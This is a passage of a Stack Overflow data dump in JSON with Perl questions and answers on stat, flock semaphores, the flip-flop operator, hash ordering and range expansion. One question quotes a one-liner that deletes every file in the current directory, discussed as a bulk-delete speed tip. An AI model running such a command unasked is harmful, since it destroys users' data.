can&#39;t call <code>stat</code> (the program) without installing it. Why can&#39;t you just use perl?"}, {"owner": {"reputation": 33, "user_id": 1649114, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/924cf25d754a92a54fa6c874b0b2171e?s=128&d=identicon&r=PG", "display_name": "user1649114", "link": "https://stackoverflow.com/users/1649114/user1649114"}, "edited": false, "score": 0, "creation_date": 1455182380, "post_id": 35298033, "comment_id": 58377945, "body": "Thanks for the clarification. It was just a question but of course I&#39;ll use perl as it&#39;s the fastest and working solution."}], "answers": [{"tags": [], "owner": {"reputation": 23042, "user_id": 237955, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/402503866b52d010376cad6756dd8c46?s=128&d=identicon&r=PG", "display_name": "amphetamachine", "link": "https://stackoverflow.com/users/237955/amphetamachine"}, "is_accepted": true, "score": 0, "last_activity_date": 1455038206, "creation_date": 1455038206, "answer_id": 35298135, "question_id": 35298033, "link": "https://stackoverflow.com/questions/35298033/solaris10-stat-command-not-found-but-works-in-perl/35298135#35298135", "title": "solaris10 stat command not found but works in perl", "body": "<p>The <code>stat</code> perl function is different from the <code>stat</code> program.</p>\n\n<p>Likely you may be running this from an environment that doesn't have a <code>stat</code> program installed (Windows).</p>\n"}], "owner": {"reputation": 33, "user_id": 1649114, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/924cf25d754a92a54fa6c874b0b2171e?s=128&d=identicon&r=PG", "display_name": "user1649114", "link": "https://stackoverflow.com/users/1649114/user1649114"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 223, "favorite_count": 0, "accepted_answer_id": 35298135, "answer_count": 1, "score": -1, "last_activity_date": 1455038206, "creation_date": 1455037890, "last_edit_date": 1455038014, "question_id": 35298033, "link": "https://stackoverflow.com/questions/35298033/solaris10-stat-command-not-found-but-works-in-perl", "title": "solaris10 stat command not found but works in perl", "body": "<p>I was reading a <a href=\"http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux\" rel=\"nofollow\">page</a> about the performance of delete operation on thousands of files and it mentions the command below</p>\n\n<pre><code>perl -e 'for(&lt;*&gt;){((stat)[9]&lt;(unlink))}'\n</code></pre>\n\n<p>Could anyone explain me why I have a 'command not found' while calling command 'stat' from the command-line while it's working through perl?</p>\n"}, {"tags": ["linux", "perl", "locking"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1455037156, "post_id": 35297140, "comment_id": 58305762, "body": "I can&#39;t replicate the behaviour. Sometimes, a process locks between unlock and close of another process, but that&#39;s it."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1455038056, "last_edit_date": 1455038056, "creation_date": 1455037677, "answer_id": 35297946, "question_id": 35297140, "link": "https://stackoverflow.com/questions/35297140/perl-flock-on-linux-what-if-many-processes-wait-to-open-a-locked-file/35297946#35297946", "title": "Perl flock on Linux: what if many processes wait to open a locked file?", "body": "<p>Only one process can hold an exclusive lock at any given time.</p>\n\n<p>As such, one of the following should be true for you:</p>\n\n<ul>\n<li>The file you are locking is located on an NFS devices. <code>flock</code> doesn't support these.</li>\n<li>The calls to <code>flock</code> you describe occurred in the same process. <code>flock</code> can't be used to exclude threads of the same process.</li>\n<li>The lock was released. Keep in mind the unlock could have happened in a forked process.</li>\n</ul>\n"}], "owner": {"reputation": 15560, "user_id": 709439, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/19b5c7e6c2772d88adcbd928daddc170?s=128&d=identicon&r=PG", "display_name": "MarcoS", "link": "https://stackoverflow.com/users/709439/marcos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 645, "favorite_count": 0, "accepted_answer_id": 35297946, "answer_count": 1, "score": 1, "last_activity_date": 1455038056, "creation_date": 1455035318, "last_edit_date": 1455036444, "question_id": 35297140, "link": "https://stackoverflow.com/questions/35297140/perl-flock-on-linux-what-if-many-processes-wait-to-open-a-locked-file", "title": "Perl flock on Linux: what if many processes wait to open a locked file?", "body": "<p>What happens if many processes are waiting to open an exclusively locked file, when it is released?  </p>\n\n<p>I would expect only one of the processes which required the open to succeed to open the file again, but it doesn't seem to be the case...</p>\n\n<p>I did read the documentation of linux <code>flock</code> system call (and also Perl's <code>flock()</code> function), but I can't find any coverage of that use case...</p>\n\n<p>This is my use case in detail:<br>\nsome CGI perl processes call one central service on the LAN, which is quite heavy and slow, and performs better if it's called by one client at a time. CGI requests are potentially many (say 50 ~ 60) and concurrent, so I use the <code>flock</code> machinery to behave as a <em>semaphore</em> for the CGI processes to wait before calling the central service, one at a time.</p>\n\n<p>This is the (simplified) code I use to implement the semaphore:</p>\n\n<pre><code>open($LOCK, \"+&gt;\" . \"/tmp/semaphore.lock\") or die(\"Can't open semaphore ($!)\");\nflock($LOCK, LOCK_EX) or die (\"Can't lock semaphore ($!)\");\n\n# &lt;CALL THE SLOW SERVICE&gt;\n\nflock($LOCK, LOCK_UN) or die(\"Can't unlock semaphore ($!)\");\nclose($LOCK);\n</code></pre>\n\n<p>The flow I'd expect is:</p>\n\n<pre><code>CGI process A opens semaphore\nCGI process A locks semaphore\nCGI process A calls service\nCGI process B opens semaphore\nCGI process C opens semaphore\nCGI process D opens semaphore\nCGI process A unlocks semaphore\nCGI process B locks semaphore\nCGI process B calls service\nCGI process B unlocks semaphore\nCGI process C locks semaphore\n...\n</code></pre>\n\n<p>But, the flow I observe is:</p>\n\n<pre><code>CGI process A opens semaphore\nCGI process A locks semaphore\nCGI process A calls service\nCGI process B opens semaphore\nCGI process C opens semaphore\nCGI process D opens semaphore\nCGI process A unlocks semaphore\nCGI process B locks semaphore\nCGI process B calls service\nCGI process C locks semaphore   (!)\nCGI process C calls service     (!)\nCGI process D locks semaphore   (!)\nCGI process D calls service     (!)\nCGI process B unlocks semaphore\n...\n</code></pre>\n\n<p>The answer (if possible) should prioritize a solution with the least possible modifications to current code, since it is in production since quite a long time, so: the fewer changes, the better... :-)</p>\n"}, {"tags": ["perl", "flip-flop", "chomp"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1455050026, "last_edit_date": 1455050026, "creation_date": 1455032033, "answer_id": 35295944, "question_id": 35295820, "link": "https://stackoverflow.com/questions/35295820/connecting-rows-in-perl-after-filter/35295944#35295944", "title": "Connecting rows in Perl after filter", "body": "<p>From flip-flop operator's documentation:</p>\n\n<blockquote>\n  <p>The value returned is either the empty string for false, or a sequence number (beginning with 1) for true. [...] The final sequence number in a range has the string \"E0\" appended to it</p>\n</blockquote>\n\n<p>So,</p>\n\n<pre><code>while (&lt;DATA&gt;) {\n   if (my $i = /\\bSTART\\b/ .. /\\bEND\\b/) {\n      s/\\n/ / if $i !~ /E0\\z/; \n      print;\n   }\n}\n</code></pre>\n\n<p>Without the flip-flop operator:</p>\n\n<pre><code>my $in = 0;\nwhile (&lt;DATA&gt;) {\n   if ($in ||= /\\bSTART\\b/) {\n      if (/\\bEND\\b/) {\n         $in = 0;\n      } else {\n         s/\\n/ /;\n      }\n      print;\n   }\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5863596, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-tdn6oudqsYU/AAAAAAAAAAI/AAAAAAAAAXw/hvyfFAQR8FU/photo.jpg?sz=128", "display_name": "jan pastyrik", "link": "https://stackoverflow.com/users/5863596/jan-pastyrik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 35295944, "answer_count": 1, "score": 0, "last_activity_date": 1455101130, "creation_date": 1455031699, "question_id": 35295820, "link": "https://stackoverflow.com/questions/35295820/connecting-rows-in-perl-after-filter", "title": "Connecting rows in Perl after filter", "body": "<p>I want ask you for some tips. My code looks like next few rows:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nwhile (&lt;DATA&gt;) {\n if (/\\bSTART\\b/ .. /\\bEND\\b/) {\n    #$together = $_;\n    #$together = chomp ($_);  \n    print ($_, \"\\n\");   \n }\n}\n\n__DATA__\nrubish\nrub\nSTART Data Data Data start 15.05.2015 Data i want end Data \nEND\nrubishend\n\n*****************\nexample:\nSTART new line 1 line 2new line 3 END\n*****************\n</code></pre>\n\n<p>My goal is to filter many line log. Output is one or two lines matching regex. But output can be one-line --> It\u00b4s what I want. Or two-line, in this case I need to join second line to the end of first. Output from my code looks like:</p>\n\n<pre><code>START Data Data Data start 15.05.2015 Data i want end Data \nEND\nSTART new line 1 line 2new line 3 END\n</code></pre>\n\n<p>What I want is:</p>\n\n<pre><code>START Data Data Data start 15.05.2015 Data i want end Data END\nSTART new line 1 line 2new line 3 END\n</code></pre>\n\n<p>Any tips how to distinguish two line output and connect it into one line? For better parsing in next steps? Thanks for answer</p>\n"}, {"tags": ["arrays", "perl", "sorting", "hash"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 4, "creation_date": 1455029988, "post_id": 35295041, "comment_id": 58300148, "body": "<i>\u201cI have a sorted hash\u201d</i>. No, you don&#39;t. Perl hashes are inherently unsorted, and deliberately so."}, {"owner": {"reputation": 13, "user_id": 5464738, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Qx92JyTAMlA/AAAAAAAAAAI/AAAAAAAAAEA/NHCWibSajFM/photo.jpg?sz=128", "display_name": "NinjaAnte", "link": "https://stackoverflow.com/users/5464738/ninjaante"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455030125, "post_id": 35295041, "comment_id": 58300266, "body": "What i mean by that is that I sorted my hash with a foreach loop by value, are the hashes only sorted within that foreach loop then? Sorry if I misunderstood something."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1455030475, "post_id": 35295041, "comment_id": 58300532, "body": "I don&#39;t see how you can possibly sort anything with a <code>for</code> loop. As I have said, if you show the code that you think &quot;sorts&quot; the hash then we will have a better idea of what you are doing"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455030629, "post_id": 35295265, "comment_id": 58300648, "body": "This assumes that the OP wants the hash elements sorted in alphabetical order of their value, even though you have supposed them to be numeric. That is a very long shot indeed"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1455030908, "post_id": 35295265, "comment_id": 58300860, "body": "Yes, you are sorting the elements alphabetically by value. That is what I wrote. If your example had <code>ten =&gt; 10</code> then it would be sorted before <code>two =&gt; 2</code>. And you really have no idea what the OP wants, as all they have said is that they have a sorted hash, which they clearly do not"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455031646, "post_id": 35295265, "comment_id": 58301498, "body": "@Borodin: That wasn&#39;t &quot;all they have said&quot;. There was also &quot;Is there a way to keep the arrays sorted in the same way as the hash, by value?&quot;"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455031671, "post_id": 35295265, "comment_id": 58301516, "body": "@Borodin: Incorrect?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455031761, "post_id": 35295265, "comment_id": 58301582, "body": "@Borodin: Because after your comment I realized it&#39;s easier to use <code>&lt;=&gt;</code> and add an explanation rather than explain what I had originally in mind."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455031814, "post_id": 35295265, "comment_id": 58301626, "body": "I&#39;d delete the answer, but it&#39;s not possible to delete accepted answers."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1455031337, "last_edit_date": 1455031337, "creation_date": 1455030058, "answer_id": 35295265, "question_id": 35295041, "link": "https://stackoverflow.com/questions/35295041/keeping-a-hash-sorted-after-converting-to-two-arrays/35295265#35295265", "title": "Keeping a hash sorted after converting to two arrays", "body": "<p>If I understand correctly, you want both arrays to be sorted by the hash values.</p>\n\n<p>Sort the indices of the second array by the values, then use the resulting list of indices to slice the first array:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nmy %hash = ( eight =&gt; 8,\n             five  =&gt; 5,\n             four  =&gt; 4,\n             nine  =&gt; 9,\n             one   =&gt; 1,\n             seven =&gt; 7,\n             six   =&gt; 6,\n             ten   =&gt; 10,\n             three =&gt; 3,\n             two   =&gt; 2,\n           );\n\nmy @array1 = keys %hash;\nmy @array2 = values %hash;\n\nmy @indices = sort { $array2[$a] &lt;=&gt; $array2[$b] } 0 .. $#array2;\n@array1 = @array1[@indices];\n@array2 = @array2[@indices];\n\nsay \"@array1\\n@array2\";\n</code></pre>\n\n<p>Or, sort the keys by value, then map the hash to the keys to get the values:</p>\n\n<pre><code>my @array1 = sort { $hash{$a} &lt;=&gt; $hash{$b} } keys %hash;\nmy @array2 = map $hash{$_}, @array1;\n</code></pre>\n\n<p>Use <code>cmp</code> instead of <code>&lt;=&gt;</code> if you want to sort the values alphabetically rather than numerically.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1455030215, "creation_date": 1455030215, "answer_id": 35295324, "question_id": 35295041, "link": "https://stackoverflow.com/questions/35295041/keeping-a-hash-sorted-after-converting-to-two-arrays/35295324#35295324", "title": "Keeping a hash sorted after converting to two arrays", "body": "<blockquote>\n  <p>I have a sorted hash</p>\n</blockquote>\n\n<p>No, you don't. Hashes are inherently unsorted, and deliberately so. You don't show what you have done that makes you think you have \"sorted\" your hash, but I promise that it is impossible. You could have written</p>\n\n<pre><code>sort %hash\n</code></pre>\n\n<p>but that will do nothing useful at all, and certainly won't change the hash's contents</p>\n\n<p>All that is guaranteed is that <code>keys</code> and <code>values</code> will return those parts of each element in the same order</p>\n\n<p>If you explain your goal then we will be able to help better</p>\n\n<blockquote>\n  <p>I want to be able to use for example array1[0] and array2[0] knowing that they are a key/value pair in the hash</p>\n</blockquote>\n\n<p>You can do that anyway. As long as you use <code>keys</code> and <code>values</code> at the same point in your program, and the hash isn't modified in-between, then <code>$hash{$keys[0]}</code> is guaranteed to be <code>$values[0]</code></p>\n\n<p>If you need to retrieve the contents of your hash in a specific order then you must describe your purpose and say better what you need</p>\n"}], "owner": {"reputation": 13, "user_id": 5464738, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Qx92JyTAMlA/AAAAAAAAAAI/AAAAAAAAAEA/NHCWibSajFM/photo.jpg?sz=128", "display_name": "NinjaAnte", "link": "https://stackoverflow.com/users/5464738/ninjaante"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "closed_date": 1455032936, "accepted_answer_id": 35295265, "answer_count": 2, "score": -3, "last_activity_date": 1455031492, "creation_date": 1455029437, "last_edit_date": 1455029738, "question_id": 35295041, "link": "https://stackoverflow.com/questions/35295041/keeping-a-hash-sorted-after-converting-to-two-arrays", "closed_reason": "Duplicate", "title": "Keeping a hash sorted after converting to two arrays", "body": "<p>I have a sorted hash that I'm converting to two separate arrays, one with keys, one values, how do i keep the arrays sorted like the hash through the process of being converted? I want to be able to use for example array1[0] and array2[0] knowing that they are a key/value pair in the hash. This is how im converting my hash:</p>\n\n<pre><code>my @array1 = keys %hash;\nmy @array2 = values %hash;\n</code></pre>\n\n<p>And now the elements of array1 &amp; array2 doesn't display the information in the same order that printing out the sorted key/values would. Is there a way to keep the arrays sorted in the same way as the hash, by value?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 12075, "user_id": 1137055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59d7b43b9eb7d01bd8f7e51febe6053c?s=128&d=identicon&r=PG", "display_name": "dgw", "link": "https://stackoverflow.com/users/1137055/dgw"}, "edited": false, "score": 1, "creation_date": 1455026038, "post_id": 35293639, "comment_id": 58297361, "body": "Have a look at <a href=\"https://metacpan.org/pod/Set::IntSpan\" rel=\"nofollow noreferrer\">Set::IntSpan</a> from CPAN."}, {"owner": {"reputation": 862, "user_id": 3586150, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/1f0969599955a953e592034929ed7a23?s=128&d=identicon&r=PG", "display_name": "Neil H Watson", "link": "https://stackoverflow.com/users/3586150/neil-h-watson"}, "edited": false, "score": 0, "creation_date": 1455027490, "post_id": 35293639, "comment_id": 58298341, "body": "Try some of your own code first, then post here what does not work."}, {"owner": {"reputation": 11, "user_id": 5903015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead88b9222c8061ca3894b8399011e50?s=128&d=identicon&r=PG&f=1", "display_name": "Kli", "link": "https://stackoverflow.com/users/5903015/kli"}, "edited": false, "score": 0, "creation_date": 1455027908, "post_id": 35293639, "comment_id": 58298626, "body": "I&#39;m newbie to perl, that&#39;s why I&#39;m asking - because have no idea."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 5903015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead88b9222c8061ca3894b8399011e50?s=128&d=identicon&r=PG&f=1", "display_name": "Kli", "link": "https://stackoverflow.com/users/5903015/kli"}, "edited": false, "score": 0, "creation_date": 1455108245, "post_id": 35296366, "comment_id": 58339876, "body": "here is problem: my ( $start, $end ) = split ( &#39;-&#39;,$_  ); - missing $_"}, {"owner": {"reputation": 11, "user_id": 5903015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead88b9222c8061ca3894b8399011e50?s=128&d=identicon&r=PG&f=1", "display_name": "Kli", "link": "https://stackoverflow.com/users/5903015/kli"}, "edited": false, "score": 0, "creation_date": 1455108258, "post_id": 35296366, "comment_id": 58339887, "body": "besides this command: &quot;push ( @values, $_ ) for ( $start..$end//$start );&quot; gives error: Search pattern not terminated at a.pl line 14."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 11, "user_id": 5903015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead88b9222c8061ca3894b8399011e50?s=128&d=identicon&r=PG&f=1", "display_name": "Kli", "link": "https://stackoverflow.com/users/5903015/kli"}, "edited": false, "score": 0, "creation_date": 1455114589, "post_id": 35296366, "comment_id": 58344511, "body": "Definitely does work. You may have an older perl version. Try <code>||</code> instead of <code>&#47;&#47;</code> - it works <i>almost</i> the same, with this input data. Likewise <code>split</code> - default to splitting <code>$_</code> anyway."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1455033198, "creation_date": 1455033198, "answer_id": 35296366, "question_id": 35293639, "link": "https://stackoverflow.com/questions/35293639/how-to-generate-list-of-numbers-from-hyphenated-and-comma-separeted-string-in-pe/35296366#35296366", "title": "How to generate list of numbers from hyphenated and comma separeted string in Perl", "body": "<p>I'd probably do it like this:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nmy $thing = '1-8,10,12-15,23'; \nmy @values; \n\n#split the string on commas.    \nfor ( split /,/, $thing ) { \n    #split each element in `-`. ($end is undefined if no `-` present)\n    my ( $start, $end ) = split ( '-' );\n    #iterate from start to end (or start to start if end is undef)\n    push ( @values, $_ ) for ( $start .. $end // $start );\n}\n\nprint join \",\", @values; \n</code></pre>\n\n<p>Prints:</p>\n\n<pre><code>1,2,3,4,5,6,7,8,10,12,13,14,15,23\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 5903015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead88b9222c8061ca3894b8399011e50?s=128&d=identicon&r=PG&f=1", "display_name": "Kli", "link": "https://stackoverflow.com/users/5903015/kli"}, "is_accepted": false, "score": 0, "last_activity_date": 1455108769, "creation_date": 1455108769, "answer_id": 35315839, "question_id": 35293639, "link": "https://stackoverflow.com/questions/35293639/how-to-generate-list-of-numbers-from-hyphenated-and-comma-separeted-string-in-pe/35315839#35315839", "title": "How to generate list of numbers from hyphenated and comma separeted string in Perl", "body": "<p>Here is fixed Sobrique solution:</p>\n\n<pre><code>use strict;\nuse warnings;\n\n\nmy $thing = '1-8,10,12-15,23'; \nmy @values; \n\n#split the string on commas.    \nfor ( split /,/, $thing ) { \n    #split each element in `-`. ($end is undefined if no `-` present)\n    my ( $start, $end ) = split ( '-',$_  );\n    if (!defined $end) { $end=$start;}\n    #iterate from start to end (or start to start if end is undef)\n    push ( @values, $_ ) for ( $start..$end );\n}\n\nprint join \",\", @values; \n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5903015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead88b9222c8061ca3894b8399011e50?s=128&d=identicon&r=PG&f=1", "display_name": "Kli", "link": "https://stackoverflow.com/users/5903015/kli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "answer_count": 2, "score": -6, "last_activity_date": 1455713923, "creation_date": 1455025402, "last_edit_date": 1455713923, "question_id": 35293639, "link": "https://stackoverflow.com/questions/35293639/how-to-generate-list-of-numbers-from-hyphenated-and-comma-separeted-string-in-pe", "title": "How to generate list of numbers from hyphenated and comma separeted string in Perl", "body": "<p>In Perl, how to generate list of numbers from hyphen/comma string like:\n<em>1-8,10,12-15,23</em> ?\nExpected output is: <em>[1, 2, 3, 4, 5, 6, 7, 8, 10, 12, 13, 14, 15,23]</em></p>\n\n<p>Ok, I have some solution that seems to work, can I optimize it? :</p>\n\n<pre><code>@cl_list = \"0,2-7,13-16\"\n@cl_list = split(/,/,join(',',@cl_list));\n\nforeach $cl (@cl_list){\n    if (index($cl, '-') != -1){ \n        @range=split(/-|,/,$cl,2);\n        $ld=$range[0];\n        $ud=$range[1];\n\n        while ($ld &lt;= $ud) {\n            push @list, $ld;\n            print \"$ld\\n\";\n           $ld++;         \n        }\n    }\n    else {\n        push @list, $ld;\n    }\n}\nprint \"list=@list\\n\";\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 2, "creation_date": 1455022356, "post_id": 35291050, "comment_id": 58294859, "body": "Please don&#39;t use that site to learn how to code Perl, that is the worst example of a tutorial I&#39;ve seen in years!  (It&#39;s not only buggy, but it also doesn&#39;t use best practices like <code>use strict;</code> and <code>use warnings</code>; it uses prototypes (<code>($$)</code>) which you shouldn&#39;t do unless you know exactly what you&#39;re doing, and as choroba mentions, it&#39;s unnecessary code, you can simply use <code>$date1 cmp $date2</code>.)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 1, "creation_date": 1455024640, "post_id": 35291050, "comment_id": 58296356, "body": "@mscha: It also declares variables in a block at the top of the code, uses <code>split &#47; &#47;</code> instead of <code>split &#39; &#39;</code> and uses overly-long variable names that try to express the type of the data when Perl isn&#39;t typed like that and has <code>$</code>, <code>@</code>, <code>%</code> etc. anyway"}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 4, "last_activity_date": 1455018532, "creation_date": 1455018532, "answer_id": 35291309, "question_id": 35291050, "link": "https://stackoverflow.com/questions/35291050/compare-time-in-perl-using-subroutine/35291309#35291309", "title": "Compare time in perl using subroutine", "body": "<p>There's a bug in the tutorial: it splits time on <code>-</code>, not <code>:</code> (even if they use <code>:</code> in the example).</p>\n\n<p>You don't need the function at all, though. Dates in this format could be compared by the standard <code>cmp</code> operator.</p>\n"}, {"tags": [], "owner": {"reputation": 367, "user_id": 4266540, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/GxWGD.jpg?s=128&g=1", "display_name": "Vasanth", "link": "https://stackoverflow.com/users/4266540/vasanth"}, "is_accepted": true, "score": 0, "last_activity_date": 1455019201, "creation_date": 1455019201, "answer_id": 35291540, "question_id": 35291050, "link": "https://stackoverflow.com/questions/35291050/compare-time-in-perl-using-subroutine/35291540#35291540", "title": "Compare time in perl using subroutine", "body": "<p>I modified 